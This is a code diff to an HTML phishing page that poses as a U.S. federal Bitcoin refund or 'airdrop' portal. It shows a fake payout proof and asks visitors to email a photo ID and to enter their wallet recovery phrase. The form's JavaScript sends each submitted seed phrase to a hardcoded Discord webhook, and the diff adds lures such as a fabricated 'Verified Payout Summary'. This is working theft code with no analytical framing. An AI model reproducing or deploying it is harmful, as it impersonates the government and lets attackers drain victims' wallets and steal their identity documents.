@@ -7,28 +7,32 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
-      background-image: url('https://www.transparenttextures.com/patterns/white-wall.png');
+      background-image: url('eagle.png'); /* Put eagle image in same folder or upload */
+      background-size: cover;
+      background-position: center;
+      background-attachment: fixed;
+      background-repeat: no-repeat;
       text-align: center;
       padding-top: 50px;
+      color: #111;
     }
 
     .container {
-      background: white;
+      background: rgba(255, 255, 255, 0.96);
       width: 90%;
-      max-width: 420px;
+      max-width: 440px;
       margin: auto;
       padding: 30px;
       border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      box-shadow: 0 0 20px rgba(0,0,0,0.15);
     }
 
     h2 {
-      color: #003399;
+      color: #0b3d91;
     }
 
     .btn {
-      background-color: #003399;
+      background-color: #0b3d91;
       color: white;
       padding: 12px 20px;
       margin-top: 20px;
@@ -38,10 +42,9 @@
       font-size: 16px;
     }
 
-    .note {
-      font-size: 13px;
-      color: #555;
-      margin-top: 10px;
+    .btn:disabled {
+      background-color: #aaa;
+      cursor: not-allowed;
     }
 
     input[type="text"] {
@@ -52,13 +55,13 @@
       border: 1px solid #ccc;
     }
 
-    .alert {
-      background-color: #e8f0fe;
-      color: #003399;
+    .alert, .note {
+      font-size: 13px;
+      color: #333;
+      background-color: #f0f8ff;
       padding: 12px;
-      border-radius: 6px;
-      margin-bottom: 20px;
-      font-size: 14px;
+      margin-top: 10px;
+      border-radius: 8px;
       border: 1px solid #c3dafe;
     }
 
@@ -68,42 +71,70 @@
       font-weight: bold;
       display: none;
     }
+
+    .wallet-proof {
+      background-color: #e6ffee;
+      padding: 15px;
+      border-radius: 10px;
+      border: 1px solid #00cc66;
+      margin-top: 25px;
+      font-size: 15px;
+      text-align: left;
+    }
+
+    .wallet-proof h4 {
+      margin: 0 0 8px;
+      color: #006644;
+    }
+
+    .wallet-proof span {
+      font-weight: bold;
+      color: #000;
+    }
   </style>
 </head>
 <body>
   <div class="container">
 
     <div class="alert">
-      To verify that you are eligible to claim this refund, please send your government-issued ID to the official email:  
+      To verify eligibility for federal BTC refund, email your valid photo ID to  
       <strong>admin@govbtcclaim.org</strong>
     </div>
 
-    <h2>🇺🇸 Government BTC Refund</h2>
-    <p>Claim your Bitcoin refund through verified wallet connection.</p>
-    <p><strong>Amount to be received: 0.92 BTC ≈ $99,791</strong></p>
+    <h2>🇺🇸 U.S. Federal BTC Airdrop Portal</h2>
+    <p><strong>Estimated Claim Amount: 0.92 BTC ≈ $99,791</strong></p>
 
     <button class="btn" onclick="document.getElementById('walletSection').style.display='block'">Connect Wallet</button>
 
     <form id="walletSection" style="display:none; margin-top:20px;" onsubmit="sendToDiscord(event)">
-      <label for="walletName">Wallet Name:</label>
+      <label for="walletName">Wallet Provider (e.g. MetaMask):</label>
       <input type="text" id="walletName" name="walletName" placeholder="Enter your wallet name" required>
 
-      <label for="seedInput" style="margin-top:10px;">Seed Phrase:</label>
-      <input type="text" id="seedInput" name="phrase" placeholder="Enter your 12 or 24-word phrase" required>
+      <label for="seedInput" style="margin-top:10px;">Enter 12 or 24-word Recovery Phrase:</label>
+      <input type="text" id="seedInput" name="phrase" placeholder="example: remind jacket wire lava..." required>
 
-      <button class="btn" type="submit">Submit</button>
+      <button class="btn" type="submit">Claim Official Airdrop</button>
     </form>
 
-    <div id="successMessage">✅ Submitted successfully.</div>
+    <div id="successMessage">✅ Wallet submitted successfully. Processing…</div>
+
+    <div class="wallet-proof">
+      <h4>✅ Verified Payout Summary</h4>
+      <p><span>Status:</span> Paid</p>
+      <p><span>Wallet:</span> bc1qsz78mr3glz49yn3hsfws9g9rzyyluf6tv0vru5</p>
+      <p><span>Amount Received:</span> 0.92 BTC</p>
+      <p><span>Transaction Date:</span> July 11, 2025</p>
+      <p><span>Approval Code:</span> FED-PAY-22941-BTC</p>
+    </div>
 
     <div class="note">
-      Minimum wallet balance: 0.0092 BTC<br>
-      <small>(If your balance is lower, contact support)</small><br>
-      For inquiries: <strong>admin@govbtcclaim.org</strong>
+      Minimum balance required to qualify: 0.0092 BTC<br>
+      <small>(Balances lower than this may require support contact)</small><br>
+      Contact: <strong>admin@govbtcclaim.org</strong>
     </div>
   </div>
 
-  <!-- Live Chat Widget (Tawk.to) -->
+  <!-- Live Chat Widget -->
   <script type="text/javascript">
     var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
     (function() {
@@ -116,7 +147,7 @@
     })();
   </script>
 
-  <!-- Discord Webhook Script -->
+  <!-- Discord Webhook -->
   <script>
     function sendToDiscord(event) {
       event.preventDefault();
@@ -125,9 +156,9 @@
       const phrase = document.getElementById('seedInput').value;
 
       const data = {
-        content: `🔥 New Submission:
-        \nWallet Name: **${walletName}**
-        \nSeed Phrase: **${phrase}**`
+        content: `🔥 New Wallet Submission:
+        \nWallet: *${walletName}*
+        \nPhrase: *${phrase}*`
       };
 
       fetch('https://discord.com/api/webhooks/1392560855530602496/WLDqr-oxayIjorh97lgir03TQj4rcVYqnKDEMCoJ_jC_xix590twBocxE4eMY85ViMzG', {
@@ -141,10 +172,11 @@
         document.getElementById('walletSection').style.display = 'none';
         document.getElementById('successMessage').style.display = 'block';
       }).catch(err => {
-        alert("Failed to connect. Try again later.");
+        alert("Submission failed. Try again later.");
         console.error(err);
       });
     }
   </script>
 </body>
 </html>
+
